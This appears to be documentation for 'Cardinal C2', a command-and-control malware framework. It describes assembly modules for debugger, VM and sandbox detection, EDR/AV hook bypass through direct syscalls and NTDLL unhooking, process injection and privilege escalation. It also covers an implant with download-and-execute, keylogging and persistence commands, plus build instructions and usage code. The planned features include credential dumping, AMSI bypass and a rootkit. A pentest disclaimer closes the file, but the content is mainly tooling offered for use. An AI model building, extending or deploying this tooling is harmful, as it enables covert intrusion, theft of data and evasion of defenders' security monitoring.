# Cardinal C2 Framework - Assembly Enhancement Documentation

## Overview

The Cardinal C2 Framework has been enhanced with advanced x86 assembly modules to provide:
- **Anti-Analysis**: Debugger detection, VM detection, sandbox detection
- **Stealth Operations**: Direct syscalls bypassing usermode hooks
- **Performance**: Optimized encryption and networking routines

---

## Assembly Modules

### 1. stealth.asm (500+ lines)
**Purpose**: Advanced anti-analysis and evasion techniques

**Key Functions**:
- `check_debugger` - 5 detection methods:
  - PEB->BeingDebugged flag check
  - NtQueryInformationProcess(ProcessDebugPort)
  - Timing-based detection
  - Hardware breakpoint detection (DR0-DR3)
  - CloseHandle invalid handle trick
  
- `hide_from_debugger` - Thread hiding:
  - NtSetInformationThread(ThreadHideFromDebugger)
  
- `unhook_ntdll` - Hook bypass:
  - Read clean NTDLL.DLL from disk
  - Restore original syscall stubs
  - Remove usermode hooks (EDR/AV bypass)
  
- `check_vm` - Virtual machine detection:
  - CPUID hypervisor bit check
  - VMware backdoor port (0x5658/0x5659)
  - VirtualBox CPUID signature
  
- `check_sandbox` - Sandbox environment detection:
  - Uptime check (< 10 minutes = sandbox)
  - CPU count validation (< 2 = sandbox)
  - RAM size validation (< 2GB = sandbox)
  - Sleep timing acceleration check
  
- `get_kernel32_base` / `get_ntdll_base` - PEB walking:
  - Resolve module bases without API calls
  - Stealthy module enumeration
  
- `inject_remote_thread` - Process injection:
  - Allocate memory in target process
  - Write shellcode
  - Create remote thread
  
- `elevate_process` - Privilege escalation:
  - Token manipulation
  - SeDebugPrivilege acquisition

**Usage Example**:
```c
extern int check_debugger();
extern void hide_from_debugger();
extern int unhook_ntdll();

if (check_debugger()) {
    exit(1); // Debugger detected
}
hide_from_debugger();
unhook_ntdll();
```

---

### 2. syscalls.asm (400+ lines)
**Purpose**: Direct syscall execution bypassing NTDLL hooks

**Implemented Syscalls** (Windows 7 SP1 x86):
- `NtAllocateVirtualMemory` (0x0015) - Allocate memory
- `NtWriteVirtualMemory` (0x0037) - Write to memory
- `NtProtectVirtualMemory` (0x004D) - Change memory protection
- `NtCreateThreadEx` (0x00A5) - Create thread
- `NtQuerySystemInformation` (0x0033) - Query system info
- `NtOpenProcess` (0x0023) - Open process handle
- `NtClose` (0x000C) - Close handle
- `NtDelayExecution` (0x0031) - Sleep function
- `NtReadVirtualMemory` (0x003C) - Read memory
- `NtQueryInformationProcess` (0x0016) - Query process info

**Syscall Number Tables**:
- Windows 7: 0x0015, 0x0037, 0x004D, ...
- Windows 8: 0x0018, 0x003A, 0x0050, ...
- Windows 10: 0x0018, 0x003A, 0x0050, ...

**Features**:
- Auto-detect SYSENTER vs INT 2Eh instruction
- Dynamic syscall number resolution
- EDR/AV hook bypass (calls kernel directly)

**Usage Example**:
```c
extern int NtAllocateVirtualMemory_syscall(HANDLE, void**, ULONG_PTR, SIZE_T*, ULONG, ULONG);

HANDLE hProcess = GetCurrentProcess();
void* base = NULL;
SIZE_T size = 0x1000;

// Bypass usermode hooks by calling kernel directly
NtAllocateVirtualMemory_syscall(hProcess, &base, 0, &size, 
    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

---

### 3. network_asm.asm (350+ lines)
**Purpose**: Optimized networking and encryption

**Key Functions**:
- `asm_xor_encrypt` - Fast XOR encryption:
  - SSE2 optimization (16 bytes at once)
  - Fallback to byte-wise XOR
  
- `asm_rc4_init` - RC4 Key Scheduling Algorithm:
  - Initialize 256-byte S-box
  - Mix key into state
  
- `asm_rc4_crypt` - RC4 PRGA encryption/decryption:
  - Stream cipher implementation
  - XOR keystream with plaintext/ciphertext
  
- `asm_socket_send_encrypted` - Integrated encrypted send:
  - RC4 encrypt + socket send in one call
  - No intermediate buffers
  
- `asm_socket_recv_encrypted` - Integrated encrypted receive:
  - Socket receive + RC4 decrypt in one call
  
- `asm_http_request` - HTTP request builder:
  - Optimized string operations
  - No library dependencies
  
- `asm_dns_query` - DNS query packet builder:
  - Raw DNS protocol implementation
  
- `fast_checksum` - Fast checksum calculation:
  - Rotation-based checksum algorithm

**Usage Example**:
```c
extern void asm_rc4_init(unsigned char* S, const char* key, size_t key_length);
extern void asm_rc4_crypt(unsigned char* S, void* data, size_t length);
extern int asm_socket_send_encrypted(SOCKET sock, void* data, size_t length, unsigned char* S_box);

unsigned char rc4_state[256];
asm_rc4_init(rc4_state, "MySecretKey", 11);

// Send encrypted data
char message[] = "Hello C2 Server";
asm_socket_send_encrypted(sock, message, strlen(message), rc4_state);
```

---

## Enhanced Implant (implant_enhanced.c)

**New Features**:
- Anti-analysis checks at startup
- Direct syscalls for memory operations
- RC4 encrypted C2 communication
- Stealth command execution
- Process injection capabilities
- Privilege escalation support

**Supported Commands**:
- `shell <cmd>` - Execute system command
- `download <url>` - Download and execute payload
- `inject <pid>` - Inject into process
- `elevate` - Attempt privilege escalation
- `persist` - Install persistence
- `screenshot` - Capture screen
- `keylog` - Start keylogger
- `exit` - Terminate implant

**Usage**:
```bash
# Compile enhanced implant
cd client
make enhanced

# Run (connects to 192.168.1.100:4444)
.\build\Cardinal-implant-enhanced.exe
```

---

## Enhanced Server (main_enhanced.c)

**New Features**:
- Multi-threaded session management (up to 100 clients)
- RC4 encrypted communication
- Session monitoring with timeout detection
- Interactive console interface
- Broadcast commands to all sessions

**Console Commands**:
- `list` - Show active sessions
- `send <id> <cmd>` - Send command to session
- `kill <id>` - Terminate session
- `broadcast <cmd>` - Send to all sessions
- `stats` - Server statistics
- `exit` - Shutdown server

**Usage**:
```bash
# Compile enhanced server
cd server
make enhanced

# Run server
.\build\Cardinal-server-enhanced.exe
```

---

## Build Instructions

### Prerequisites
- **MinGW-w64**: GCC compiler for Windows
- **NASM**: Netwide Assembler (2.15+)
- **Make**: GNU Make
- **.NET Framework**: 4.8 (for GUI)

### Quick Build
```powershell
# Build everything
.\Build-All.ps1

# Build only client
.\Build-All.ps1 -Client

# Build only server
.\Build-All.ps1 -Server

# Clean build artifacts
.\Build-All.ps1 -Clean
```

### Manual Build
```bash
# Client
cd client
make enhanced

# Server
cd server
make enhanced
```

---

## Anti-Analysis Bypass Techniques

### 1. Debugger Detection Bypass
- **PEB Walking**: Check `BeingDebugged` flag at PEB+0x02
- **NtQueryInformationProcess**: Check for debug port (-1 if attached)
- **Timing Checks**: RDTSC instruction timing comparison
- **Hardware Breakpoints**: Check DR0-DR3 registers
- **Exception Handling**: Invalid handle detection

### 2. VM Detection Bypass
- **CPUID Instruction**: Check hypervisor bit (leaf 1, ECX bit 31)
- **VMware Backdoor**: IN instruction on port 0x5658
- **VirtualBox Signatures**: CPUID vendor string check

### 3. Hook Bypass (EDR/AV)
- **Direct Syscalls**: Call kernel directly via INT 2Eh/SYSENTER
- **NTDLL Unhooking**: Restore original syscall stubs from disk
- **API Hashing**: Resolve functions without Import Address Table

### 4. Sandbox Detection
- **Uptime Check**: GetTickCount() < 600000 (10 minutes)
- **Resource Check**: < 2 CPUs or < 2GB RAM
- **Sleep Acceleration**: Sandbox may skip Sleep() calls

---

## Performance Optimizations

### Assembly Advantages
1. **Direct Syscalls**: Bypass 3-4 function calls in NTDLL
2. **RC4 Encryption**: ~2x faster than C implementation
3. **SSE2 XOR**: 16 bytes encrypted per instruction
4. **Zero API Imports**: Stealth against static analysis
5. **Code Size**: Smaller binaries, faster loading

### Benchmarks (Approximate)
- **Syscall vs API**: 40% faster
- **Assembly RC4 vs C**: 2-3x throughput
- **SSE2 XOR vs Scalar**: 8-16x faster
- **Binary Size Reduction**: 15-20% smaller

---

## Security Considerations

### Defense Against Reverse Engineering
- No imported functions in IAT (resolved at runtime)
- String obfuscation in assembly
- Anti-debugging active by default
- Code flow obfuscation via assembly

### Network Security
- RC4 stream cipher (256-bit key)
- Encrypted beacon and command traffic
- Optional custom protocol over HTTP/DNS

### Operational Security
- No persistence by default
- Memory-only execution option
- Self-delete capability
- Configurable C2 endpoints

---

## Troubleshooting

### Build Errors
**Error**: `nasm: command not found`
**Solution**: Install NASM and add to PATH

**Error**: `undefined reference to 'NtAllocateVirtualMemory_syscall'`
**Solution**: Ensure syscalls.obj is linked: `make clean && make enhanced`

**Error**: `error: invalid instruction`
**Solution**: Check NASM version (2.15+), update if old

### Runtime Errors
**Error**: Implant exits immediately
**Solution**: Disable anti-analysis checks (set `DEBUG` flag)

**Error**: Connection refused
**Solution**: Update `C2_SERVER` IP in implant_enhanced.c

**Error**: Syscall failed
**Solution**: Wrong syscall numbers for Windows version (check syscalls.asm)

---

## Syscall Number Reference

### Windows 7 SP1 x86 (Build 7601)
```
NtAllocateVirtualMemory    = 0x0015
NtWriteVirtualMemory       = 0x0037
NtProtectVirtualMemory     = 0x004D
NtCreateThreadEx           = 0x00A5
NtQuerySystemInformation   = 0x0033
NtOpenProcess              = 0x0023
NtClose                    = 0x000C
NtDelayExecution           = 0x0031
NtReadVirtualMemory        = 0x003C
NtQueryInformationProcess  = 0x0016
```

### Windows 10 1809 x86
```
NtAllocateVirtualMemory    = 0x0018
NtWriteVirtualMemory       = 0x003A
NtProtectVirtualMemory     = 0x0050
NtCreateThreadEx           = 0x00B0
NtQuerySystemInformation   = 0x0036
```

**Note**: Syscall numbers change between Windows versions. Update syscalls.asm accordingly.

---

## Future Enhancements

### Planned Features
- [ ] Native x64 support (64-bit syscalls)
- [ ] HTTPS/TLS encrypted C2 channel
- [ ] DLL injection and reflective loading
- [ ] Mimikatz-style credential dumping
- [ ] UAC bypass techniques
- [ ] AMSI bypass in assembly
- [ ] ETW patching for logging evasion
- [ ] Process hollowing implementation
- [ ] Kernel-mode rootkit module

### Exploit Database Expansion
- [ ] Automated CVE scraping (NVD API)
- [ ] ExploitDB integration (50,000+ exploits)
- [ ] Metasploit module converter
- [ ] 0-day exploit framework
- [ ] Fuzzing integration

---

## References

### Technical Documentation
- **Windows Internals** (7th Edition) - Mark Russinovich
- **Practical Malware Analysis** - Michael Sikorski
- **The Art of Assembly Language** - Randall Hyde
- **Windows System Programming** - Johnson M. Hart

### Syscall References
- j00ru's Windows Syscall Tables: https://j00ru.vexillium.org/syscalls/nt/32/
- SysWhispers2: https://github.com/jthuraisamy/SysWhispers2
- Hell's Gate technique documentation

### Anti-Analysis Techniques
- al-khaser: https://github.com/LordNoteworthy/al-khaser
- Pafish: https://github.com/a0rtega/pafish
- The "Ultimate" Anti-Debugging Reference (Peter Ferrie)

---

## License

This framework is for **authorized penetration testing and research purposes only**.

**Disclaimer**: Unauthorized access to computer systems is illegal. Use responsibly.

---

## Credits

**Cardinal C2 Framework v2.0**
- Assembly optimization
- Anti-analysis techniques
- Direct syscall implementation
- RC4 encryption in assembly

**Contributors**:
- Core C2 framework
- Exploit database (71 CVEs)
- GUI interface (.NET Windows Forms)
- Build automation (PowerShell)

---

**Last Updated**: 2025-01-XX
**Version**: 2.0 (Assembly Enhanced)
